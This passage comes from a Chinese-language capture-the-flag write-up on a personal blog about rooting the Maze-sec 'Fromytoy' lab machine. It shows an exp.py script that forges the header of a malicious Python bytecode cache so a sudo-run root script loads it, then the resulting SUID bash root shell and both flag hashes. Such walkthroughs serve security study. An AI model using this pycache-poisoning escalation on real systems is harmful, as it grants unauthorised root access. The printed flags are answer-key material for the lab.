os<br><br>source_file = <span class="hljs-string">&quot;/usr/local/lib/python_scripts/system_utils.py&quot;</span><br>target_pyc = <span class="hljs-string">&quot;/tmp/__pycache__/pwn.cpython-39.pyc&quot;</span><br>output_pyc = <span class="hljs-string">&quot;/usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc&quot;</span><br><br><span class="hljs-comment"># 1. 获取 root 源文件的元数据</span><br><span class="hljs-built_in">stat</span> = os.stat(source_file)<br>mtime = int(stat.st_mtime)<br>size = stat.st_size &amp; 0xFFFFFFFF<br><br><span class="hljs-comment"># 2. 读取你编译好的恶意 pyc</span><br>with open(target_pyc, <span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    data = bytearray(f.read())<br><br><span class="hljs-comment"># 3. 修正头部元数据 (针对 Python 3.7+)</span><br><span class="hljs-comment"># 偏移 8-11: 时间戳 (Little-endian)</span><br>data[8:12] = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, mtime)<br><span class="hljs-comment"># 偏移 12-15: 文件大小</span><br>data[12:16] = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, size)<br><br><span class="hljs-comment"># 4. 写入目标位置</span><br>with open(output_pyc, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>    f.write(data)<br><br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;[+] Successfully forged &#123;output_pyc&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>执行 <code>exp.py</code>文件，生成修正后的 pyc 文件 并移动到 <code>/usr/local/lib/python_scripts/__pycache__/</code>目录下覆盖原有的<code>pyc</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ python3 /tmp/exp.py<br>[+] Successfully forged /usr/local/lib/python_scripts/__pycache__/system_utils.cpython-39.pyc<br><br>miku@fromytoy:/tmp$ <span class="hljs-built_in">mv</span> __pycache__/ /usr/local/lib/python_scripts/__pycache__/<br></code></pre></td></tr></table></figure>
+
+<p>执行sudo，进行提取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ <span class="hljs-built_in">sudo</span> /usr/bin/python3 /usr/local/lib/python_scripts/cleanup_task.py<br>[*] Starting system cleanup...<br>[+] Cleanup completed successfully.<br>miku@fromytoy:/tmp$ <span class="hljs-built_in">ls</span> -la /tmp<br>total 1192<br>drwxrwxrwt 10 root root    4096 Feb  3 22:20 .<br>drwxr-xr-x 18 root root    4096 Mar 18  2025 ..<br>drwxrwxrwt  2 root root    4096 Feb  3 21:24 .ICE-unix<br>drwxrwxrwt  2 root root    4096 Feb  3 21:24 .Test-unix<br>drwxrwxrwt  2 root root    4096 Feb  3 21:24 .X11-unix<br>drwxrwxrwt  2 root root    4096 Feb  3 21:24 .XIM-unix<br>drwxrwxrwt  2 root root    4096 Feb  3 21:24 .font-unix<br>-rwsr-sr-x  1 root root 1168776 Feb  3 22:20 bash<br>-rw-r--r--  1 miku miku     774 Feb  3 22:19 exp.py<br>-rw-r--r--  1 miku miku     111 Feb  3 22:19 pwn.py<br>drwx------  3 root root    4096 Feb  3 21:24 systemd-private-55f31a80f4b8437c83a2a1fe00361dc6-apache2.service-KndNHh<br>drwx------  3 root root    4096 Feb  3 21:24 systemd-private-55f31a80f4b8437c83a2a1fe00361dc6-systemd-logind.service-aWzEdg<br>drwx------  3 root root    4096 Feb  3 21:24 systemd-private-55f31a80f4b8437c83a2a1fe00361dc6-systemd-timesyncd.service-g1GcSi<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">miku@fromytoy:/tmp$ LC_ALL=C /tmp/bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(miku) gid=1000(miku) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(miku)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、查看FALG"><a href="#五、查看FALG" class="headerlink" title="五、查看FALG"></a>五、查看FALG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /root/root.txt /home/miku/user.txt <br>a6c7cf996c275fa5afe6e47bc6f5c79e<br><br><br><br>Good morning, and <span class="hljs-keyword">in</span> <span class="hljs-keyword">case</span> I don<span class="hljs-string">&#x27;t see you, Good afternoon, Good evening, And good night</span><br><span class="hljs-string">26d1ebd4ec8c55cc69f190d0d37f6dac</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">願うことさえ</span><br><span class="hljs-string">許されない世界なのかな</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash-5.0# </span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Wordpress/" class="print-no-link">#Wordpress</a>
+      
+        <a href="/tags/Simple-File-List/" class="print-no-link">#Simple File List</a>
+      
+        <a href="/tags/Suid-rev/" class="print-no-link">#Suid_rev</a>
+      
+        <a href="/tags/pycache%E6%8A%95%E6%AF%92/" class="print-no-link">#pycache投毒</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec_Fromytoy</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mazesec-Fromytoy/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Maze-sec/Mazesec-115final/" title="Mazesec_115final">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Mazesec_115final</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx_Agent/" title="Vlx_Agent">
+                        <span class="hidden-mobile">Vlx_Agent</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
